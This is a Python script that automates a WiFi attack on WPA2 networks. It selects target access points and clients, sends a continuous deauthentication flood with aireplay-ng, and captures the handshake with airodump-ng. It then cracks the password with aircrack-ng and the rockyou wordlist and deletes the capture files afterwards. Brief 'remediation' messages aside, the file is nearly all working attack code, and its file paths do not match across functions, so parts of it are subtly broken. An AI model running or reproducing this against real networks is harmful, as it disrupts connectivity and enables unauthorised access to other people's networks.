import subprocess, signal, sys, time, os, shutil, csv, glob

import subprocess

def deauth(ap_mac, c_mac, interface):
    # Construct the command with the provided parameters
    command = [
        'sudo', 'aireplay-ng',
        '-0', '0',  # Number of deauth packets to send, 0 means send them continuously
        '-a', ap_mac,  # Access Point MAC address
        '-c', c_mac,  # Client MAC address
        interface  # Network interface to use
    ]

    # Run the command in the background
    try:
        subprocess.Popen(command)
        print(f"Deauth attack launched against AP MAC: {ap_mac} and client MAC: {c_mac} using interface: {interface}")
    except Exception as e:
        print(f"An error occurred when trying to launch deauth attack: {e}")

def dump(ap_mac, channel):
    try:
        # Ensure the output directory exists
        output_directory = "/mnt/data/wpa2_handshake"
        os.makedirs(output_directory, exist_ok=True)
        file_prefix = f"{output_directory}/airodump"

        # Construct the command with the provided parameters
        command = [
            'airodump-ng',
            '-c', channel,
            '--bssid', ap_mac,
            'wlan0mon',
            '--write', file_prefix,
            '--output-format', 'cap'
        ]
        print("Running airodump-ng... Press Ctrl+C to stop.")

        # Execute the airodump-ng command
        airodump_process = subprocess.Popen(command)
        
        try:
            airodump_process.wait()
        except KeyboardInterrupt:
            airodump_process.terminate()
            print("\nAirodump-ng stopped by user.")

    except Exception as e:
        print(f"An error occurred: {e}")
    
    finally:
        print("Capture file saved.")

def crack():
    cap_file = "/mnt/data/wpa2_handshake-01.cap"
    cap_file_pattern = "/mnt/data/wpa2_handshake*"
    
    if not os.path.exists(cap_file):
        print("The .cap file does not exist. Please ensure the file path is correct.")
        return
    
    try:
        print("Attempting to crack WPA password...")
        subprocess.run(["sudo", "aircrack-ng", cap_file, "-w", "/usr/share/wordlists/rockyou.txt"])
        print("Cracking attempt completed.")
        
    except KeyboardInterrupt:
        print("\nCracking attempt interrupted by the user.")
    except Exception as e:
        print(f"Failed to start crack: {e}")
    finally:
        files_to_delete = glob.glob(cap_file_pattern)
        if files_to_delete:
            print("Deleting .cap files...")
            for file in files_to_delete:
                os.remove(file)
            print(".cap files deleted successfully.")

def move_cap_file():
    try:
        shutil.move("./wpa_attack-01.cap", "/mnt/data/wpa_attack-01.cap")
        print(".cap file moved to /mnt/data/")
    except Exception as e:
        print("Failed to move .cap file:", e)
        
def identify_wpa2():
    file_path = "/mnt/data/access_points.txt"
    try:
        with open(file_path, mode='r') as file:
            csv_reader = csv.reader(file)
            vulnerable_aps = []
            for row in csv_reader:
                if "WPA2" in row[1]:
                    vulnerable_aps.append(row)
            if vulnerable_aps:
                print("Vulnerable Access Points Found:")
                for ap in vulnerable_aps:
                    print(f"SSID: {ap[2]}, BSSID: {ap[0]}, Encryption: {ap[1]}")
                    print("Note: Uses WPA2 encryption. While more secure than WEP, it's still less secure compared to WPA3.")
                    print("Remediation: Upgrade to WPA3 encryption for enhanced security.\n")
            else:
                print("No vulnerable access points found using WPA2 encryption.")
    except FileNotFoundError:
        print(f"The file {file_path} was not found.")
    except Exception as e:
        print(f"An error occurred while analyzing vulnerabilities: {e}")

def ensure_data_directory_exists():
    directory = "/mnt/data"
    if not os.path.exists(directory):
        os.makedirs(directory)
    return directory

def run_airodump(bssid):
    try:
        channel = "6"  # Assuming channel 6; adjust as necessary.
        file_prefix = ensure_data_directory_exists() + "/airodump"
        command = [
            'airodump-ng',
            '-c', channel,
            '--bssid', bssid,
            'wlan0mon',
            '--write', file_prefix,
            '--output-format', 'csv'
        ]
        print("Running airodump-ng... Press Ctrl+C to stop.")
        
        airodump_process = subprocess.Popen(command)
        
        try:
            airodump_process.wait()
        except KeyboardInterrupt:
            airodump_process.terminate()
            print("\nAirodump-ng stopped by user.")
        
        directory = ensure_data_directory_exists()
        csv_file = None
        for file in os.listdir(directory):
            if file.startswith("airodump") and file.endswith('.csv'):
                csv_file = directory + '/' + file
                break

        if csv_file is None:
            print("No CSV file generated by airodump-ng.")
            return

        clients = []
        with open(csv_file, mode='r') as file:
            content = file.read()
            client_section = content.split('Station MAC,')[1] if 'Station MAC,' in content else ''
            csv_reader = csv.reader(client_section.splitlines())
            next(csv_reader)  # Skip the header row.
            for row in csv_reader:
                if len(row) > 0 and row[0].strip() != '':
                    clients.append(row[0].strip())

        if not clients:
            print("No clients found.")
            return

        clients_filename = directory + '/clients.txt'
        with open(clients_filename, 'w') as clients_file:
            for client in clients:
                clients_file.write(client + '\n')

        print("Clients found and saved to:", clients_filename)

        print("Select a client by its index number:")
        for index, client in enumerate(clients):
            print(f"{index}: {client}")

        selected_index = int(input("Enter the index number of the target client: "))
        if 0 <= selected_index < len(clients):
            selected_client = clients[selected_index]
            print(f"Selected client MAC: {selected_client}")
            return selected_client
        else:
            print("Invalid index selected.")
            return None

    except Exception as e:
        print(f"An error occurred: {e}")
        return None
    
    finally:
        try:
            for file in glob.glob(ensure_data_directory_exists() + "/airodump*"):
                os.remove(file)
            print("All airodump-ng files deleted.")
        except Exception as e:
            print(f"Error deleting airodump-ng files: {e}")

def target_ap():
    file_path = "/mnt/data/access_points.txt"
    try:
        with open(file_path, mode='r') as file:
            csv_reader = csv.reader(file)
            wpa2_aps = []
            for row in csv_reader:
                if "WPA2" in row[1]: 
                    wpa2_aps.append(row)

            if wpa2_aps:
                print("Select a Vulnerable Access Point by its index number:")
                for index, ap in enumerate(wpa2_aps):
                    print(f"{index}: SSID: {ap[2]}, BSSID: {ap[0]}, Encryption: {ap[1]}")
                    
                selected_index = int(input("Enter the index number of the target AP: "))
                if 0 <= selected_index < len(wpa2_aps):
                    selected_ap = wpa2_aps[selected_index]
                    return selected_ap[2], selected_ap[0]  # Returning SSID and BSSID
                else:
                    print("Invalid index selected.")
                    return None, None
            else:
                print("No vulnerable access points found using WPA2 encryption.")
                return None, None

    except FileNotFoundError:
        print(f"The file {file_path} was not found.")
        return None, None
    except Exception as e:
        print(f"An error occurred: {e}")
        return None, None

def target_c(bssid):
    client_mac = run_airodump(bssid)
    return client_mac
    
def main(essid, ap_mac, your_mac, c_mac):
    channel = "6"
    interface = "wlan0mon"

    try:
        deauth(ap_mac, c_mac, interface)
        dump(ap_mac, channel)
    except Exception as e:
        print(f"An error occurred: {e}")
